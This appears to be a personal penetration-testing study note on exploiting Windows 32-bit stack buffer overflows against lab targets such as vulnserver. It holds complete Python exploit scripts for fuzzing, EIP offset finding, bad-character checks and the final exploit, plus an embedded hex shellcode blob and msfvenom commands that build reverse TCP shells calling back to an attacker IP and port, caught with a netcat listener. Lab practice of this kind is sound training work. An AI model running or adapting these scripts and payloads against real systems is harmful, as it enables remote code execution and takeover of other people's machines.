# Windows 32-bit Buffer Overflows

--- 

- script to use [[buffer_overflow_server.py]]
- walkthrough: https://github.com/gh0x0st/Buffer_Overflow


Process:
1. open vulnerable app in Immunity Debugger
2. generate the payload to trigger the buffer overflow vulnerability with Mona
	- `!mona pc 1100` (where "1100" is the number of bytes to create)
3. open the "pattern.txt" file that Mona generated and copy the hex version into the payload variable in the buffer_overflow.py script 
4. then start the server app (buffer_overflow.py) and the run the FTP client from Immunity Debugger
5. the client should connect and then crash (because of buffer overflow) 
6. the EIP register in Immunity Debugger will then contain the  byte value in payload that the client app crashed at -- use Mona to verify the correct number of junk bytes that you need to reach this byte value (to be replaced with shellcode)
	- `!mona po <address_in_EIP>`
7. then find the address of a CALL/JMP ESP instruction in the client app (you need to call this first to then call back to your shellcode)
	- `!mona jmp -r esp -m kernel` and select an address found 
8. stop the debugger and edit the Python script:
	- create the correct number of junk bytes from step 6: `payload = "\xc3"*<number_needed>`
	- then append the address of the CALL/JMP ESP instruction found: `payload += "<address>"`
	- then append shellcode you want to execute: `payload += ("<shellcode>")`
9. now start the server again and execute the FTP once more -- this time the shellcode should execute and the exploit should work 

<br>

- note: you may need to avoid certain bad characters in the payload to prevent it from prematurely exiting 


<br>

TCM Buffer Overflow Process:
>  setup vulnserver on a Windows box and have a Kali host be able to reach it 

1. Spiking:
	- start vulnserver on Windows host (as administrator) and run Immunity Debugger (as administrator), and attach vulnerserver process to Immunity Debugger 
	- make sure you can connect with Kali: `nc -nv <ip> 9999` -> `HELP`
	- send random data to services running to see if you can get them to crash or misbehave:
		- `generic_send_tcp <ip> <port> <spike_script> <skip_var> <skip_str>`
		- i.e. `generic_send_tcp 10.0.1.4 9999 trun.spk 0 0`
	- the spike script (can change "TRUN" to different command):
		```spk
		s_readline();
		s_string("TRUN ");
		s_string_variable("0");
		```
	- then when executed check the process in Immunity, look at ESP and EIP registers
2. Fuzzing:
	- fuzzing is very similar to spiking (sending a bunch of characters at a service/command) but spiking it done to test out different services/commands, while fuzzing is done when you know you have a vulnerable service/command and you want to attack it specifically 
	- fuzzing script:
		```python
		#!/usr/bin/python
		import sys, socket
		from time import sleep

		buffer = "A" * 100

		while True:
			try:
				s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				s.connect(('10.0.1.4', 9999))

				s.send(('TRUN /.:/' + buffer))
				s.close()
				sleep(1)
				buffer = buffer + "A"*100
			except:
				print "Fuzzing crashed at %s bytes" % str(len(buffer))
				sys.exit()
		```
		- incrementally increases the number of "A"s send to TRUN command running on vulnserver
	- execute: `./fuzz.py`
3. Finding the offset:
	- need to find out where you overwrite the EIP 
	- can use tools in "/usr/share/metasploit-framework/tools/exploit/" to do this
	- a) use `pattern_create.rb` to create a cyclical pattern to send to the vulnerable app, filling in the number of bytes found with the fuzzing script before
		- `pattern_create.rb -l <bytes>`
		- i.e. `pattern_create.rb -l 3000`
	- b) copy the pattern given here into the Python script and edit:
		```python
		#!/usr/bin/python
		import sys, socket

		offset = "<pattern>"

		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(('10.0.1.4', 9999))

			s.send(('TRUN /.:/'' + offset))
			s.close()
		except:
			print "Error connecting to server"
			sys.exit()
		
		```
	- c)  run this edited Python script, while Immunity and vulnserver are running, then when vulnserver crashes note the EIP register value 
	- c) use `pattern_offset.rb` to calculate the offset needed to affect the EIP register and take control of the program using the buffer overflow
		- `pattern_offset.rb -l <bytes> -q <EIP_value_when_crashed>`
		- i.e. `pattern_create.rb -l 3000 -q 386F4337`
	- d) running this will give you the offset (in bytes) needed to affect the EIP register (i.e. if 2003 bytes, then there are 2003 bytes before the EIP register which is 4 bytes long)
4. Overwriting the EIP:
	- need to verify we can overwrite the EIP with data we want
	- edit Python script again:
		```python
		#!/usr/bin/python
		import sys, socket

		# As = bytes to get to EIP (offset)
		# Bs = overwrite EIP with 4 Bs
		shellcode = "A" * 2003 + "B" * 4


		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(('10.0.1.4', 9999))

			s.send(('TRUN /.:/'' + shellcode))
			s.close()
		except:
			print "Error connecting to server"
			sys.exit()
		```
		- setup Immunity and vulnserver again and run this script: `fuzz.py` 
		- inspect the value in the EIP register, it should be "42424242" = 4 "B"s in hexadecimal 
		- now you have control of the EIP and can begin exploiting 
5. Finding Bad Characters:
	- bad characters are characters which will negatively effect the shellcode, this can be done by running all hexadecimal characters through the vulnerable program and seeing if any act up (by default, the null byte `\x00` will act up)
	- a) find a list of bad characters online (i.e. googling bad chars or from [here](https://www.ins1gn1a.com/identifying-bad-characters/))
	- b) edit the Python script to include all hexadecimal characters to run through (you can leave of the null byte `\x00` and assume it is bad):
		```python
		#!/usr/bin/python
		import sys, socket

		badchars = (
		"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
		"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
		"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
		"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
		"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
		"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
		"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
		"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
		"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
		"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
		"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
		"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
		"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
		"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
		"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
		"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
		
		shellcode = "A" * 2003 + "B" * 4 + badchars


		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(('10.0.1.4', 9999))

			s.send(('TRUN /.:/'' + shellcode))
			s.close()
		except:
			print "Error connecting to server"
			sys.exit()
		```
	- c) execute script, while Immunity and vulnserver are running: `./fuzz.py`
	- d) inspect the crashed program's hex dump in Immunity:
		- right-click on the ESP register and select "Follow in Dump"
		- then manually go through each of the hex characters your script sent to the program in the hex dump and look for any that are out of place (are bad characters)
		- i.e. 01 should correspond with the `\x01` you sent, 02 with `\x02`, etc. 
		- any out of place characters are bad and should be noted down to avoid in the shellcode you generate 
6. Finding the right module:
	- this involves finding the right DLL (or something similar) that has no memory protections (i.e. DEP, ASLR, safe SEH, etc.)
	- you can use Mona and it's modules to do this directly in Immunity Debugger:
		- google "mona modules" ([here](https://github.com/corelan/mona) -> download the mona.py file ->  put it into `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands`
	- a) start Immunity and vulnserver, then in Immunity run `!mona modules` 
		- this will return a list of modules the binary imports to run 
		- you want to find a module (DLL) that has all exploit protections labeled as False (i.e. Rebase, SafeSEH, ASLR, etc.)
			- i.e. `essfunc.dll`
	- b) next you need to search for a JMP ESP (or CALL ESP) instruction with `!mona find -s "\xff\xe4" -m <module>`
		- you can find the opcode for a JMP ESP instruction with the nasm shell in Kali:
			- `locate nasm_shell` -> `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` -> [opcode] (i.e. `JMP ESP`)
			- this will return the opcode you need to search for in Immunity (i.e. `FFE4`)
		- then you can search for all the matching instructions and note the return addresses of these instructions
			- i.e. `!mona find -s "\xff\xe4" -m essfunc.dll` -> found address `625011af`
	- c) next, edit the Python script again to add in this JMP ESP address:
		```python
		#!/usr/bin/python
		import sys, socket

		# put address of JMP ESP instruction in (for EIP) 
		# needs to be in little-endian (reversed from Immunity output)
		shellcode = "A"*2003 + "\xaf\x11\x50\x62"

		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(('10.0.1.4', 9999))

			s.send(('TRUN /.:/'' + shellcode))
			s.close()
		except:
			print "Error connecting to server"
			sys.exit()
		```
		- this JMP ESP address acts as a jump point to point back to your exploit shellcode 
		- note: need to use address in little-endian format (reverse from Immunity output)
	- d) then, open up Immunity again and click on the "follow expression" icon (black icon showing arrow pointing at a column of squares, after the last red icon and before the "l" icon), and then enter the address of the JMP ESP instruction you used in your edited Python script:
	- e) once you have found this address, double click on the instruction to add a breakpoint here and run your Python script
	- f) this should run program up to this breakpoint and not crash it, and in the EIP should be the address of the JUM ESP instruction you have set -- now you can exploit this to run your shellcode 
7. Generating Shellcode and Gaining Shells
	- a) create payload shellcode with msfvenom:
		- create reverse TCP shell: `msfvenom -p <payload> lhost=<attacker_ip> lport=<listening_port> EXITFUNC=thread -f <format> -a <architectu> -b <bad_characters> 
		- i.e. `msfvenom -p windows/shell_reverse_tcp lhost=10.0.1.5 lport=1234 EXITFUNC=thread -f c -a x86 -b "\x00"`
		- note the payload size
	- b) copy and paste shellcode into Python script:
		```python
		#!/usr/bin/python
		import sys, socket

		overflow = (
		"\xda\xc8\xd9\x74\x24\xf4\xbe\xa6\xc9\x5c\xad\x5b\x33\xc9\xb1"
		"\x52\x31\x73\x17\x03\x73\x17\x83\x65\xcd\xbe\x58\x95\x26\xbc"
		"\xa3\x65\xb7\xa1\x2a\x80\x86\xe1\x49\xc1\xb9\xd1\x1a\x87\x35"
		"\x99\x4f\x33\xcd\xef\x47\x34\x66\x45\xbe\x7b\x77\xf6\x82\x1a"
		"\xfb\x05\xd7\xfc\xc2\xc5\x2a\xfd\x03\x3b\xc6\xaf\xdc\x37\x75"
		"\x5f\x68\x0d\x46\xd4\x22\x83\xce\x09\xf2\xa2\xff\x9c\x88\xfc"
		"\xdf\x1f\x5c\x75\x56\x07\x81\xb0\x20\xbc\x71\x4e\xb3\x14\x48"
		"\xaf\x18\x59\x64\x42\x60\x9e\x43\xbd\x17\xd6\xb7\x40\x20\x2d"
		"\xc5\x9e\xa5\xb5\x6d\x54\x1d\x11\x8f\xb9\xf8\xd2\x83\x76\x8e"
		"\xbc\x87\x89\x43\xb7\xbc\x02\x62\x17\x35\x50\x41\xb3\x1d\x02"
		"\xe8\xe2\xfb\xe5\x15\xf4\xa3\x5a\xb0\x7f\x49\x8e\xc9\x22\x06"
		"\x63\xe0\xdc\xd6\xeb\x73\xaf\xe4\xb4\x2f\x27\x45\x3c\xf6\xb0"
		"\xaa\x17\x4e\x2e\x55\x98\xaf\x67\x92\xcc\xff\x1f\x33\x6d\x94"
		"\xdf\xbc\xb8\x3b\x8f\x12\x13\xfc\x7f\xd3\xc3\x94\x95\xdc\x3c"
		"\x84\x96\x36\x55\x2f\x6d\xd1\x50\xb0\x6c\x24\x0d\xb2\x6e\x22"
		"\x1f\x3b\x88\x40\x8f\x6a\x03\xfd\x36\x37\xdf\x9c\xb7\xed\x9a"
		"\x9f\x3c\x02\x5b\x51\xb5\x6f\x4f\x06\x35\x3a\x2d\x81\x4a\x90"
		"\x59\x4d\xd8\x7f\x99\x18\xc1\xd7\xce\x4d\x37\x2e\x9a\x63\x6e"
		"\x98\xb8\x79\xf6\xe3\x78\xa6\xcb\xea\x81\x2b\x77\xc9\x91\xf5"
		"\x78\x55\xc5\xa9\x2e\x03\xb3\x0f\x99\xe5\x6d\xc6\x76\xac\xf9"
		"\x9f\xb4\x6f\x7f\xa0\x90\x19\x9f\x11\x4d\x5c\xa0\x9e\x19\x68"
		"\xd9\xc2\xb9\x97\x30\x47\xd9\x75\x90\xb2\x72\x20\x71\x7f\x1f"
		"\xd3\xac\xbc\x26\x50\x44\x3d\xdd\x48\x2d\x38\x99\xce\xde\x30"
		"\xb2\xba\xe0\xe7\xb3\xee")

		shellcode = "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*32 + overflow

		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect(('10.0.1.4', 9999))

			s.send(('TRUN /.:/'' + shellcode))
			s.close()
		except:
			print "Error connecting to server"
			sys.exit()
		```
		- important to add in some NOP instructions `x\90` to act as padding and make sure shellcode executes
	- c) setup a netcat listener on attacker box: `nc -lvnp 1234` 
	- d) run vulnserver on target box 
	- e) run final Python script to exploit buffer overflow and get a reverse shell
		

		
	
<br>

THM Buffer Overflow Process:
> https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

1. Setup:
	- launch binary under control of Immunity Debugger (run as admin) and configure Mona o save commands to a certain folder with: `!mona config -set workingfolder c:\mona\%p`
2. Fuzzing:
	- script "fuzzer.py":
	```python
	#!/usr/bin/env python3
	import socket, time, sys

	ip = "10.10.74.213" 	# REPLACE 
	port = 1337				# REPLACE
	timeout = 5
	prefix = "OVERFLOW1 " 	# REPLACE

	string = prefix + "A" * 100

	while True:
	  try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		  s.settimeout(timeout)
		  s.connect((ip, port))
		  s.recv(1024)
		  print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
		  s.send(bytes(string, "latin-1"))
		  s.recv(1024)
	  except:
		print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
		sys.exit(0)
	  string += 100 * "A"
	  time.sleep(1)
	```
	  - run script: `python3 fuzzer.py` -- make note of the largest number of bytes that were sent 
3. Crash Replication and Controlling EIP:
	- script "exploit.py":
	```python
	import socket

	ip = "10.10.74.213"			# REPLACE
	port = 1337					# REPLACE
	prefix = "OVERFLOW1 "		# REPLACE
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "<cyclic_pattern>"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
	  s.connect((ip, port))
	  print("Sending evil buffer...")
	  s.send(bytes(buffer + "\r\n", "latin-1"))
	  print("Done!")
	except:
	  print("Could not connect.")
	
	```
	  - run `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes_found>` to generate a cyclic pattern of a length of the bytes found to crash the binary 
	  - copy the payload generated into the "payload" variable of the "exploit.py" script above 
	  - re-launch the binary under the control of Immunity Debugger and run the exploit script: `python3 exploit.py`
	  - this will crash the binary again, then run `!mona findmsp -distance <bytes_found>` to find the offset to the pattern send by exploit script 
		  - this will be in the output: `EIP contains normal pattern : ... (offset XXXX)`
	  - next, copy this offset into the "offset" variable in exploit.py and change the "retn" variable to "BBBB"
	  - finally, restart the binary with Immunity Debugger and run the exploit script once more
	  - now when the binary crashes the EIP register should be overwritten with 4 B's (`42424242`)
4. Finding Bad Characters
	- generate a byte array with Mona (excluding the null byte `\x00`): `!mona bytearray -cpb \x00`
	- then copy the C strings in the "bytearray.txt" file generate by Mona and put them into a Python array in the "payload" variable in the exploit.py script (remove `\x00` byte from start if included)
	- restart the binary in Immunity Debugger and run the modified exploit.py script 
	- then, compare the chars in the payload to the chars in the  bytearray.bin file with the command: `!mona compare -f c:\mona\oscp\bytearray.bin -a esp`
		- may need to change the location of "bytearray.bin"
		- this command will result in a window showing any differences in the characters in the two arrays -- if there are differences these might be bad characters and should be excluded 
		- note, not all of these might be bad chars as sometimes bad chars cause the next byte to get corrupted as well, or even effect the rest of the sting -- so ignore chars if the one immediately proceeding is a bad char
	- make a note of all the bad chars found in the comparison and generate a new byte array in Mona excluding these (i.e. `!mona bytearray -cpb \x00\xa0\xf1`
	- copy the new "bytearray.txt" file Mona generates into the "payload" variable of the exploit.py script, restart the binary, and re-run exploit.py -- repeat this until all bad chars are removed
		- when the bad char comparison results in a status of "Unmodified" or "!!! Hooray, normal shellcode unmodified !!!" you are good
5. Finding a Jump Point
	- find a jump point back to the ESP register (excluding the bad chars found) with the Mona command: `!mona jmp -r esp -cpb \x00\xa0\xf1`
	- results will be displayed in the "Log data" window where you can choose and address found -- choose an address where ASLR, Rebase, SafeSEH, are False
	- copy this address into the "retn" variable of the exploit.py script -- write it backwards since the system is little endian 
		- i.e. the address is `\x01\x02\x03\x04` in Immunity, write it as `\x04\x03\x02\x01` in your exploit
6. Generate Payload
	- generate the shellcode to be used in the "payload" variable with *msfvenom*
		- i.e. `msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -b "<bad_chars>" -f c`
		- may need to use a bind shell
	- copy the generated C code strings into the "payload" variable in the exploit.py script:
		```python
		payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"  
		"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"  
		...  
		"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"  
		"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
		```
7. Prepend NOPs
	- since an encoder is likely used to generate the payload, you will need some space in memory for the payload to unpack itself, which you can do by setting the "padding" variable to a string of 16 or more "No Operation" (`\x90`) bytes
	- i.e. `padding = "\x90" * 16`
8. Exploit
	- with the correct prefix, offset, return address, padding, and payload set, you can now run the buffer overflow to get a reverse shell
	- setup a netcat listener: `nc -lvnp 4444`
	- restart the binary one last time, and run the exploit : `python3 exploit.py`


